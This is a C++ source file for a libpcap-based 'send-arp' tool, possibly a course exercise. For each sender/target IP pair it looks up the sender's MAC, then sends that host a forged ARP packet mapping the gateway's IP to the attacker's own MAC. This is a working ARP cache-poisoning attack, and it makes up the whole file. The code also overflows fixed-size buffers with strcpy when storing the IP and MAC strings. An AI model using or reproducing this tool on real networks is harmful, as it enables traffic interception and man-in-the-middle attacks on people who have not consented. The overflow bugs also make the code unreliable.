#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

//+++++
bool get_s_ip(char* dev, char* ip) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);

	close(s);

	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	std::string str = std::string(my_ip);

	if (str.length() > 0) {
		strcpy(ip, str.c_str());
		return true;
	}
	
	return false;
}

bool get_s_mac(char* dev, char* mac){
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if(str.length() > 0){
		strcpy(mac, str.c_str());
		return true;
	}

	return false;
}
//+++++

int main(int argc, char* argv[]) {
	if (argc <= 3 || argc%2 == 1) {
		usage();
		return -1;
	}

	int count = (argc - 2)/2;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	/////
	char s_ip[Ip::SIZE];
	if (get_s_ip(dev, s_ip)) {
		printf("My IP address = %s\n", s_ip);
	} else {
		printf("Couldn't get my IP address\n");
		return -1;
	}
	/////

	/////
	char s_mac[Mac::SIZE];
	if(get_s_mac(dev, s_mac)){
		printf("My MAC address = %s\n", s_mac);
	}
	else{
		printf("Couldn't get my MAC address\n");
		return -1;
	}
	/////
	
	for(int i=0; i<count; i++){

		/////
		char *you_ip = argv[2+(2*i)];
		char *gate_ip = argv[3+(2*i)];
		std::string v_mac;

		EthArpPacket packet;
		
		packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		packet.eth_.smac_ = Mac(s_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(s_mac);
		packet.arp_.sip_ = htonl(Ip("4.4.4.4"));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(you_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		/////
		
		while(true){
			struct pcap_pkthdr* header;
			const u_char* packet;

			int res = pcap_next_ex(handle, &header, &packet);

			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr *ethernet = (EthHdr*) packet;
			ArpHdr *arp = (ArpHdr*) (packet + sizeof(EthHdr));

			std::string arp_r_s_ip = std::string(arp->sip());

			if((ethernet->type() == EthHdr::Arp) && (arp->op() == ArpHdr::Reply) && (arp_r_s_ip.compare(you_ip) == 0)){

				v_mac = std::string(arp->smac());

                printf("Sender_%d's MAC = %s\n\n", i+1, v_mac.c_str());

				break;
			
			}
		
		}
		//End of "while"

	/////
		packet.eth_.dmac_ = Mac(v_mac);
		
		packet.arp_.sip_ = htonl(Ip(gate_ip));
		packet.arp_.tmac_ = Mac(v_mac);
		
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	/////

	}
	//End of "for"

	pcap_close(handle);

	return -1;
}